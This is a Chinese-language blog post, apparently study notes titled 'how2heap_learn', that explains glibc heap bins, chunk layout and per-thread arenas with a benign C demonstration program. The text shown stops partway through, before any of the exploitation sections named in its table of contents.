<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.2/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"xiaosolll.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.2.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
  </script>
<meta name="description" content="glibc堆分配策略malloc的时候不会是你申请多大就分配多大，第一次申请首先划分一大块内存，频繁向操作系统申请内存耗费时间。 随后切下一小部分返回给用户，多次分配释放以后，维护这些不断变动、切割的内存块比较困难，所以添加多个缓冲池（bin）来管理这些释放的小内存块，在下次用户请求内存块的时候首先在bin中查找。 glibc2.31维护以下binstcache bin 2.26以后新加g入的内容">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap_learn">
<meta property="og:url" content="https://xiaosolll.github.io/2021/09/09/how2heap-learn/index.html">
<meta property="og:site_name" content="Antinomy">
<meta property="og:description" content="glibc堆分配策略malloc的时候不会是你申请多大就分配多大，第一次申请首先划分一大块内存，频繁向操作系统申请内存耗费时间。 随后切下一小部分返回给用户，多次分配释放以后，维护这些不断变动、切割的内存块比较困难，所以添加多个缓冲池（bin）来管理这些释放的小内存块，在下次用户请求内存块的时候首先在bin中查找。 glibc2.31维护以下binstcache bin 2.26以后新加g入的内容">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210911200016709.png">
<meta property="og:image" content="https://i.imgur.com/Iy59yqk.png">
<meta property="og:image" content="https://i.imgur.com/H1n8uM1.png">
<meta property="og:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210917191410991.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20190810082836599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2019081008403339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNDUzMjg1,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="https://i.imgur.com/v5tFgAp.png">
<meta property="og:image" content="https://i.imgur.com/rjpAhlB.png">
<meta property="og:image" content="https://pic3.zhimg.com/v2-770e5f98dc3d690d06ed94e5a35873ca_r.jpg">
<meta property="og:image" content="https://img-blog.csdn.net/20130625110751828?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRExVVEJydWNlWmhhbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center">
<meta property="og:image" content="https://img-blog.csdn.net/20130625110817750?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRExVVEJydWNlWmhhbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center">
<meta property="og:image" content="https://img-blog.csdn.net/20130625110835437?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRExVVEJydWNlWmhhbmc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center">
<meta property="article:published_time" content="2021-09-09T12:09:02.000Z">
<meta property="article:modified_time" content="2021-10-24T12:27:23.429Z">
<meta property="article:author" content="eetan">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:/Users/86152/AppData/Roaming/Typora/typora-user-images/image-20210911200016709.png">


<link rel="canonical" href="https://xiaosolll.github.io/2021/09/09/how2heap-learn/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>
<title>how2heap_learn | Antinomy</title>
  




  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Antinomy</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#glibc%E5%A0%86%E5%88%86%E9%85%8D%E7%AD%96%E7%95%A5"><span class="nav-number">1.</span> <span class="nav-text">glibc堆分配策略</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#glibc2-31%E7%BB%B4%E6%8A%A4%E4%BB%A5%E4%B8%8Bbins"><span class="nav-number">1.1.</span> <span class="nav-text">glibc2.31维护以下bins</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85heaptrack"><span class="nav-number">1.1.1.</span> <span class="nav-text">安装heaptrack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#double-free"><span class="nav-number">1.1.2.</span> <span class="nav-text">double free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#forging-chunk"><span class="nav-number">1.1.3.</span> <span class="nav-text">forging chunk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jarvisoj-itemboard"><span class="nav-number">1.1.4.</span> <span class="nav-text">jarvisoj_itemboard</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-attack"><span class="nav-number">1.1.5.</span> <span class="nav-text">fastbin attack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.2.</span> <span class="nav-text">参考链接</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux%E5%A0%86%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">Linux堆的一些基础知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E7%9A%84%E6%A6%82%E8%BF%B0"><span class="nav-number">3.</span> <span class="nav-text">堆的概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%A0%86"><span class="nav-number">3.1.</span> <span class="nav-text">什么是堆</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="nav-number">3.2.</span> <span class="nav-text">堆的基本操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E6%93%8D%E4%BD%9C%E8%83%8C%E5%90%8E%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">3.3.</span> <span class="nav-text">堆操作背后的系统调用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E7%9A%84%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-number">4.</span> <span class="nav-text">堆的相关数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BE%AE%E8%A7%82%E7%BB%93%E6%9E%84"><span class="nav-number">4.1.</span> <span class="nav-text">微观结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-chuck"><span class="nav-number">4.1.1.</span> <span class="nav-text">malloc_chuck</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chunk%E7%9B%B8%E5%85%B3%E5%AE%8F"><span class="nav-number">4.1.2.</span> <span class="nav-text">chunk相关宏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin"><span class="nav-number">4.1.3.</span> <span class="nav-text">bin</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84bin"><span class="nav-number">4.1.3.1.</span> <span class="nav-text">数组中的bin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastbin"><span class="nav-number">4.1.3.2.</span> <span class="nav-text">fastbin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unsorted-bin%E7%9A%84%E6%9D%A5%E6%BA%90"><span class="nav-number">4.1.3.3.</span> <span class="nav-text">unsorted bin的来源</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#last-remainder"><span class="nav-number">4.1.4.</span> <span class="nav-text">last remainder</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8F%E8%A7%82%E7%BB%93%E6%9E%84"><span class="nav-number">4.2.</span> <span class="nav-text">宏观结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#arena"><span class="nav-number">4.2.1.</span> <span class="nav-text">arena</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#heap-info"><span class="nav-number">4.2.2.</span> <span class="nav-text">heap_info</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-state"><span class="nav-number">4.2.3.</span> <span class="nav-text">malloc_state</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%E5%A0%86%E5%AE%9E%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">深入了解堆实现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">5.1.</span> <span class="nav-text">堆初始化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-consolidate"><span class="nav-number">5.1.1.</span> <span class="nav-text">malloc_consolidate()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%A0%86"><span class="nav-number">5.2.</span> <span class="nav-text">创建堆</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-number">5.2.1.</span> <span class="nav-text">unlink</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98%E5%9D%97"><span class="nav-number">5.3.</span> <span class="nav-text">申请内存块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#libc-malloc"><span class="nav-number">5.3.1.</span> <span class="nav-text">_libc_malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#int-malloc"><span class="nav-number">5.3.2.</span> <span class="nav-text">_int_malloc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#chunk%E4%B8%8D%E5%90%8C%E8%8C%83%E5%9B%B4%E7%94%B3%E8%AF%B7%E5%AE%9E%E7%8E%B0"><span class="nav-number">5.3.2.1.</span> <span class="nav-text">chunk不同范围申请实现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98%E5%9D%97"><span class="nav-number">5.4.</span> <span class="nav-text">释放内存块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#libc-free"><span class="nav-number">5.4.1.</span> <span class="nav-text">_libc_free</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AE%B9%E6%9D%A5%E6%BA%90"><span class="nav-number">6.</span> <span class="nav-text">内容来源</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#uaf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">6.1.</span> <span class="nav-text">uaf漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tcache-bin"><span class="nav-number">7.</span> <span class="nav-text">tcache bin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-botcake-%E5%9D%97%E9%87%8D%E5%8F%A0"><span class="nav-number">7.0.1.</span> <span class="nav-text">tcache_botcake 块重叠</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tcache-house-of-einherjar"><span class="nav-number">7.0.2.</span> <span class="nav-text">tcache_house_of_einherjar</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lib-malloc-%E3%80%81-int-malloc-%EF%BC%89%E3%80%81-lib-free-%E3%80%81malloc-hook%E8%AF%A6%E8%A7%A3"><span class="nav-number">7.1.</span> <span class="nav-text">_lib_malloc() 、_int_malloc(）、_lib_free()、malloc_hook详解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9%EF%BC%9A"><span class="nav-number">7.1.0.1.</span> <span class="nav-text">漏洞点：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#libmalloc%EF%BC%9A"><span class="nav-number">7.2.</span> <span class="nav-text">libmalloc：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#int-malloc%E5%86%85%E9%83%A8%E6%93%8D%E4%BD%9C"><span class="nav-number">7.3.</span> <span class="nav-text">int_malloc内部操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%B8%BB%E8%A6%81%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="nav-number">7.3.0.1.</span> <span class="nav-text">其主要执行流程：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%B8%BB%E8%A6%81%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%89%88%E6%9C%AC%E4%BA%8C%EF%BC%9A"><span class="nav-number">7.3.0.2.</span> <span class="nav-text">其主要执行流程版本二：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%A5%E6%9C%89tcache%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F"><span class="nav-number">7.3.1.</span> <span class="nav-text">拥有tcache的工作方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#tcache-stashing-unlink"><span class="nav-number">8.</span> <span class="nav-text">tcache stashing unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-smashing-unlink"><span class="nav-number">8.1.</span> <span class="nav-text">tcache_smashing_unlink</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%84%E4%B8%AAchunk%E7%9A%84%E5%A4%A7%E5%B0%8F"><span class="nav-number">8.2.</span> <span class="nav-text">各个chunk的大小</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%88%E8%BF%9B%E5%85%88%E5%87%BA%EF%BC%9F%E5%85%88%E8%BF%9B%E5%90%8E%E5%87%BA%EF%BC%9F"><span class="nav-number">8.3.</span> <span class="nav-text">先进先出？先进后出？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-unlink"><span class="nav-number">8.4.</span> <span class="nav-text">tcache_unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%81%E4%BC%9A%E4%BA%A7%E7%94%9Flast-remainder"><span class="nav-number">8.4.1.</span> <span class="nav-text">谁会产生last remainder?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcache-unlink-1"><span class="nav-number">8.5.</span> <span class="nav-text">tcache_unlink</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#int-free"><span class="nav-number">8.5.1.</span> <span class="nav-text">int_free():</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#free%E5%87%BD%E6%95%B0%E7%9A%84%E6%89%A7%E8%A1%8C%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="nav-number">8.5.1.1.</span> <span class="nav-text">free函数的执行内容：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux%E8%BF%9B%E7%A8%8B%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8Fbrk-mmap"><span class="nav-number">8.6.</span> <span class="nav-text">linux进程分配内存的两种方式brk(),mmap()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%83%85%E5%86%B5%E4%B8%80%E3%80%81malloc%E5%B0%8F%E4%BA%8E128k%E7%9A%84%E5%86%85%E5%AD%98"><span class="nav-number">8.6.1.</span> <span class="nav-text">情况一、malloc小于128k的内存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%83%85%E5%86%B5%E4%BA%8C%E3%80%81malloc%E5%A4%A7%E4%BA%8E128k%E7%9A%84%E5%86%85%E5%AD%98"><span class="nav-number">8.6.2.</span> <span class="nav-text">情况二、malloc大于128k的内存</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#libc-free-%E3%80%81int-free"><span class="nav-number">8.7.</span> <span class="nav-text">libc_free()、int_free()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#libc-free-1"><span class="nav-number">8.7.1.</span> <span class="nav-text">libc_free():</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">eetan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">26</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/09/09/how2heap-learn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="eetan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Antinomy">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          how2heap_learn
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-09 20:09:02" itemprop="dateCreated datePublished" datetime="2021-09-09T20:09:02+08:00">2021-09-09</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-24 20:27:23" itemprop="dateModified" datetime="2021-10-24T20:27:23+08:00">2021-10-24</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1 id="glibc堆分配策略"><a href="#glibc堆分配策略" class="headerlink" title="glibc堆分配策略"></a>glibc堆分配策略</h1><p>malloc的时候不会是你申请多大就分配多大，第一次申请首先划分一大块内存，频繁向操作系统申请内存耗费时间。</p>
<p>随后切下一小部分返回给用户，多次分配释放以后，维护这些不断变动、切割的内存块比较困难，所以添加多个缓冲池（bin）来管理这些释放的小内存块，在下次用户请求内存块的时候首先在bin中查找。</p>
<h2 id="glibc2-31维护以下bins"><a href="#glibc2-31维护以下bins" class="headerlink" title="glibc2.31维护以下bins"></a>glibc2.31维护以下bins</h2><p>tcache bin 2.26以后新加g入的内容，最大0x400 优先分配过来，优先查找。</p>
<p>fast bin</p>
<p>unsorted bin</p>
<p>small bin</p>
<p>large bin</p>
<hr>
<p>堆块结构</p>
<p>​                                  – - -</p>
<p>​                                  头部</p>
<p>返回给用户的指针–》– - -</p>
<p>​                                 数据</p>
<p>​                                   —-</p>
<p>头部包含前一个（物理相邻）chunk的大小，本chunk（包含头部0x10字节，64位，0x8，32位）的大小</p>
<p>以及两个特殊的chunk（堆块）:</p>
<p>这两个chunk是直接由arena进行管理的。</p>
<p>top chunk：用于在任何bin中都找不到合适的堆块进行分配时，划分的堆块，如果这个堆块也不够，则会分配一个更大的top chunk进行切割，原先的top chunk会变成free的堆块被挂在适当的bin中。</p>
<p>last remainder chunk：当发生堆块的切割时，记录最近一次切割剩下的堆块，如 释放了0x1000的堆块，随后又分配了0x500,glibc会为剩下的0xa00构造成一个被释放的堆块，last remainder指针将会指向这个堆块。</p>
<p>ptmalloc2引入了arenas的概念，每个竞技场本质上是一个完全不同的堆，它完全管理自己的chunk allocation和free bins。主函数有个arenas是主竞技场，线程也有别的arenas。AMP后三位中的A就是表明当前的chunk是否由主arenas分配，0是1不是。</p>
<p>线程运行的本质其实就是函数执行。由于线程运行的本质就是函数运行，函数运行时信息是保存在栈帧中的，因此 <strong>每个线程都有自己独立的、私有的栈区。</strong>线程共享进程的资源，也有自己的私有资源，</p>
<blockquote>
<p>私有资源：所属线程的栈区、程序计数器、栈指针、运行时使用的寄存器</p>
<p>共享资源：代码区、数据区、堆区</p>
</blockquote>
<p>arena的实现：</p>
<p>arena管理各个堆，里面包含mutex、flags、fastbin指针、topchunk指针、last reminder、bins（存储unsorted bin，small bins、large bins的chunk链表）、binmap用一个bit来标识某一个bin中是否包含空闲chunk。</p>
<p>主线程 main arena /其他线程 thread arena</p>
<p>一个<em>进程</em>至少有一个<em>线程</em>，这个<em>线程</em>是主<em>线程</em>！,每个进程都有在入口分配一个堆区，然后top chunk 然后切割top chunk</p>
<p>如果有线程则像b7604000这块堆区一样，另外开辟</p>
<p><img src="C:\Users\86152\AppData\Roaming\Typora\typora-user-images\image-20210911200016709.png" alt="image-20210911200016709"></p>
<p>线程堆分配与回收</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//编译选项 gcc -g heap.c -lpthread -m32 -o heap </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在平台Linux/x86和glibc中现在是这样的</p>
<p>1.堆往高地址增长。</p>
